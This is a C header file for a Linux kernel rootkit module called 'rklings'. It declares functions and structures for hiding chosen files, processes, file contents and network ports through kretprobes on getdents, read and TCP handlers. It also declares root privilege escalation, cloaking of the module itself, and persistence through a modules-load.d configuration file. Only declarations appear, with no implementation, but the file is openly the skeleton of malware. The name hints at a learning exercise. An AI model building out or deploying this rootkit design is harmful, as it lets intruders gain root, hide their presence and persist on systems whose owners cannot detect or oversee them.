/* SPDX-License-Identifier: GPL-2.0 */
#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/kprobes.h>
#include <linux/spinlock.h>
#include <linux/types.h>

#define RK_TARGET_MAX	32
#define RK_NAME_MAX	64
#define PERSIST_PATH	"/etc/modules-load.d/rklings.conf"
#define MODULE_NAME_STR "rklings"

/* Target list */
struct rk_target_list {
	spinlock_t lock;
	char targets[RK_TARGET_MAX][RK_NAME_MAX];
	int count;
};

extern struct rk_target_list rk_file_targets;
extern struct rk_target_list rk_pid_targets;
extern struct rk_target_list rk_content_targets;
extern struct rk_target_list rk_port_targets;

void rk_target_init(struct rk_target_list *list);
int rk_target_add(struct rk_target_list *list, const char *name);
int rk_target_remove(struct rk_target_list *list, int idx);
bool rk_target_match(struct rk_target_list *list, const char *name);
bool rk_line_matches(struct rk_target_list *list, const char *line, int len);

/* Escalation */
int rk_escalate(void);
void rk_set_escalate_pid(pid_t pid);

/* Proc interface */
int rk_proc_init(void);
void rk_proc_exit(void);

/* Module cloaking */
void rk_cloak(void);
void rk_uncloak(void);

/* Persistence */
int rk_persist(void);
int rk_unpersist(void);

/* Command dispatch */
int rk_dispatch(const char *cmd);

/* Probes (owned by dispatch.c and filter.c) */
extern struct kretprobe rk_mkdir_probe;
extern struct kretprobe rk_mkdirat_probe;
extern struct kretprobe rk_getdents_probe;
extern struct kretprobe rk_read_probe;
extern struct kretprobe rk_tcp4_probe;
extern struct kretprobe rk_tcp6_probe;

#endif /* ROOTKIT_H */
